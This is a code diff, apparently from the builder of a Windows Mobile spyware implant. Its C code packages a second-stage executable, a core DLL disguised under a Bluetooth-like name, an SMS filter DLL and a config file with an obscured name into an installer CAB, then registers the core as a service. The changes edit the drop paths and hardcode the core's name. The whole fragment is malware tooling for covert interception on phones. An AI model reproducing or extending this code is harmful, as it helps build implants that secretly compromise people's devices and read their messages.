@@ -121,7 +121,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	/* CAB GENERATION                                                       */
 	/************************************************************************/
 
-	wsprintf(wsDropPath, L"%%Windows%%\\autorun2.exe");
+	wsprintf(wsDropPath, L"\\Windows\\autorun2.exe");
 
 	if (AddFile(wsDropPath, wsSecondFile)) {
 		printf("Adding Second Stage to cab... ok\n");
@@ -130,7 +130,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		return ERROR_EMBEDDING;
 	}
 
-	wsprintf(wsDropPath, L"%%Windows%%\\bthclient.dll");
+	wsprintf(wsDropPath, L"\\Windows\\bthclient.dll");
 	
 	if (AddFile(wsDropPath, wsCoreFile)) {
 		printf("Adding Core to cab... ok\n");
@@ -139,7 +139,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		return ERROR_EMBEDDING;
 	}
 	
-	wsprintf(wsDropPath, L"%%Windows%%\\SmsFilter.dll");
+	wsprintf(wsDropPath, L"\\Windows\\SmsFilter.dll");
 
 	if (AddFile(wsDropPath, wsSmsFile)) {
 		printf("Adding SMS filter to cab... ok\n");
@@ -148,7 +148,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		return ERROR_EMBEDDING;
 	}
 
-	wsprintf(wsDropPath, L"%%Windows%%\\$MS313Mobile\\cptm511.dql");
+	wsprintf(wsDropPath, L"\\Windows\\$MS313Mobile\\cptm511.dql");
 
 	if (AddFile(wsDropPath, wsConfigFile)) {
 		printf("Adding Config to cab... ok\n");
@@ -168,15 +168,8 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	WCHAR wsKeyPath[MAX_PATH];
 	WCHAR wsDLL[MAX_PATH];
-	WCHAR *wsCore;
+	WCHAR *wsCore = L"bthclient";
 	BOOL ret = TRUE;
-
-	if ((wsCore = wcschr(wsCoreFile, L'.' )) != NULL)
-		*wsCore = 0;
-
-	if ((wsCore = wcsrchr(wsCoreFile, L'\\' )) == NULL) {
-		wsCore = wsCoreFile;
-	}
 
 	// Add reg key to cabinet
 	wsprintf(wsKeyPath, L"Services\\%s", wsCore);
